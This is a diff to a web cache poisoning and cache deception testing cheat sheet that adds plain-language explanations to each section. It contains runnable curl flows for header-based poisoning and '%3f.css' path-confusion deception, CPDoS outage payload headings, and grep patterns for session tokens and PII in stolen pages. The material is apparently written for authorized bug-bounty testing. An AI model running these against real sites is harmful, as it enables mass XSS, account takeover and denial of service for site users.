@@ -8,6 +8,7 @@ probe uses a **cache-buster** so you land on YOUR key, never the shared producti
 ---
 
 ## 0. Cache fingerprint — read the response, name the layer
+> **What & when:** step one — figure out *which coffee-shop chain* you're dealing with, because each keys and stores differently. Read the response headers to name the layer (Cloudflare/Fastly/Akamai/…) and learn its "this was the saved batch" tell. Everything downstream depends on knowing the layer's quirks.
 
 | Header seen | Cache layer | Hit tell |
 |-------------|-------------|----------|
@@ -28,9 +29,26 @@ curl -s -D- -o/dev/null "https://t/path?cb=SAMEVALUE"   # 2nd time same cb → H
 # poc/cache_detect.py automates hit/miss + layer id.
 ```
 
+### 0.1 The whole attack as copy-paste curl (two worked flows — see Guide §5.1 / §12.2)
+> **What & when:** the fastest way to *see* the bug end-to-end. Flow A proves poisoning (a canary served to a request that never sent it); Flow B proves deception (a session-less request reading your own session's page). Both watch the same thing: a `MISS` you influenced becoming a `HIT` for a *different* request.
+```bash
+# ── FLOW A — POISONING (unkeyed X-Forwarded-Host → served to others) ──
+H="canary8f3a.oastify.com"
+curl -s -D- "https://t/?cb=A1" -H "X-Forwarded-Host: $H" | grep -Ei "x-cache|$H"   # 1) reflected? (expect MISS + $H)
+curl -s -D- "https://t/?cb=A1"                            | grep -Ei "x-cache|$H"   # 2) SAME key, NO header →
+#    if $H is STILL present with X-Cache: HIT → UNKEYED + cached → served to others ⭐  (that line IS the finding)
+
+# ── FLOW B — DECEPTION (%3f.css → cross-session read) ──
+C="session=<YOUR-OWN-A>"
+curl -s -D- "https://t/account%3f.css" -H "Cookie: $C" | grep -Ei "x-cache|age|<your-marker>"  # 1) your private page, MISS
+curl -s -D- "https://t/account%3f.css"                 | grep -Ei "x-cache|age|<your-marker>"  # 2) NO cookie →
+#    if your marker returns with X-Cache: HIT → cross-session theft from cache ⭐ (grade by the artifact in the body)
+```
+
 ---
 
 ## 1. Cache-buster (do this FIRST — safety + isolation, Guide §3)
+> **What & when:** the mandatory safety belt — order under a unique name so your spiked batch is filed under *your* name only, never served to real customers. Do this *before* any payload, and confirm each new value creates a fresh MISS (proving you're isolated). No isolation = do not fire poisoning payloads at a live cache.
 
 ```
 ?cb=UNIQUE                     # a random query param — usually keyed → your own MISS
@@ -44,6 +62,7 @@ Origin/Host cache-buster       # some caches key on Host — a unique vhost isol
 ---
 
 ## 2. Unkeyed-input discovery — canary headers (Guide §4)
+> **What & when:** hunt for the ingredient the kitchen adds but the barista won't write on the cup. Spray these header canaries, then run the 4-step confirm — the crucial step is #4 (does your tracer survive a re-order *without* it?). A "yes" means the input is unkeyed and poisonable; that's your primitive.
 
 Plant a canary, check (a) reflected and (b) served to a request that DIDN'T send it.
 ```
@@ -75,6 +94,7 @@ Canary reflected in: page links · `<script src>`/`<link href>` · `Location` ·
 ---
 
 ## 3. Poisoning payloads by reflection sink (Guide §5–§9)
+> **What & when:** once you have an unkeyed input, pick the payload for *where it lands in the drink* — a resource URL (A → mass XSS), a redirect (B → OAuth theft), raw HTML (C → reflected XSS), a GET body (D → fat GET), a cloaked param (E), or a cached JS file (F → site-wide). Always with a benign proof host on your own busted key.
 
 **A) Reflected into a resource URL (`<script src>`/`<link>`/import) → mass XSS (benign proof host):**
 ```
@@ -118,6 +138,7 @@ GET /static/config.js?cb=U   with  X-Forwarded-Host: YOURHOST   → window.API="
 ---
 
 ## 4. CPDoS payloads (availability — AUTHORIZE, prove on YOUR key only, Guide §10/§20)
+> **What & when:** for taking the shop *offline* — make the kitchen produce an error the barista then saves and serves to everyone (a cached 4xx = outage). This is a denial-of-service: get explicit authorization, prove the error caches on your *own* busted key, and never knock a live shared page down.
 
 ```
 HHO (Header Oversize) — origin 400/431, CDN caches the error:
@@ -135,6 +156,7 @@ HMO (Method Override) — origin errors, error cached for the GET key:
 ---
 
 ## 5. Cache DECEPTION — path-confusion & delimiter matrix (Guide §12–§14)
+> **What & when:** the other direction — trick the barista into shelving a customer's personal drink as a menu item. Walk this matrix against a sensitive authenticated page (with your session on); each row is a different character that makes the kitchen see `/account` while the cache sees `.css`. The winning row returns your private data *and* flips to a session-less HIT.
 
 Base = a sensitive authenticated endpoint (`/account`, `/api/me`, `/settings`, `/orders`, `/profile`). Request each **with your
 own session**, watch for (a) your private content returned AND (b) a cache HIT on a session-less repeat.
@@ -179,6 +201,7 @@ done
 ---
 
 ## 6. What to grep for in a deception hit (rate the severity, Guide §18)
+> **What & when:** once you've stolen a cached page, this decides its severity — grep the body for what you got. A reusable key (session/reset/API token) = Critical ATO; personal details (CSRF/PII) = High.
 
 ```
 session / token / bearer / authorization / csrf / xsrf / _token / api[_-]?key / secret
@@ -204,6 +227,7 @@ reset / password / email / phone / address / ssn / card / account[_-]?id
 ---
 
 ## 8. Triage rules (don't waste a report)
+> **What & when:** the final gate before submitting — match your evidence to a row. Every "REPORT" row hinges on the same thing: you proved the cache *re-served* your influence to a *different* request. If you only saw it in your own cup, you're on a "NOT a bug" row — go get the served-to-others half first.
 
 ```
 unkeyed input reflected + SERVED to a request without it + XSS/redirect sink   → REPORT (Critical/High); benign marker
